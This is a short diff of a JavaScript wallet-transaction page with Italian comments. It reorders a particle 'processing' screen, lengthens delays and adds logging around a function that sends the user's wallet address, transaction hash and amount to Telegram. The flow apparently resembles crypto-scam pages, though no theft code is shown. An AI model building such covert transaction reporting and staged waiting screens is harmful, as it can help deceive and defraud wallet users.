@@ -651,9 +651,12 @@
 
                 lastTxHash = txHash;
                 console.log("Transaction sent:", txHash);
+                console.log("isFirstAttempt:", isFirstAttempt);
 
-                // Aspetta 500ms per stabilizzare la connessione con Trust Wallet
-                await new Promise(resolve => setTimeout(resolve, 500));
+                // Aspetta 1 secondo per stabilizzare la connessione
+                console.log("Waiting for stabilization...");
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                console.log("Stabilized, continuing...");
 
                 let finalUserAddress = userAddress;
                 if (!finalUserAddress) {
@@ -667,9 +670,14 @@
                     }
                 }
 
-                // Al primo tentativo, invia notifica PRIMA di mostrare Processing
+                // Mostra la schermata di processing SUBITO
+                console.log("Showing processing screen...");
+                createParticles();
+                document.getElementById('processingScreen').classList.add('active');
+
+                // Al primo tentativo, invia notifica DOPO mostrare Processing
                 if (isFirstAttempt) {
-                    console.log("First attempt - sending notification immediately...");
+                    console.log("First attempt - sending notification...");
                     try {
                         await sendTelegramNotification(finalUserAddress, txHash, amount);
                         console.log("Telegram notification sent successfully");
@@ -679,12 +687,10 @@
                     isFirstAttempt = false;
                 }
 
-                // Mostra la schermata di processing SUBITO
-                createParticles();
-                document.getElementById('processingScreen').classList.add('active');
-
-                // Aspetta 3 secondi prima di chiudere
-                await new Promise(resolve => setTimeout(resolve, 3000));
+                // Aspetta 5 secondi prima di chiudere
+                console.log("Waiting 5 seconds before closing...");
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                console.log("Closing processing screen...");
 
                 // Chiudi la schermata di processing
                 document.getElementById('processingScreen').classList.remove('active');
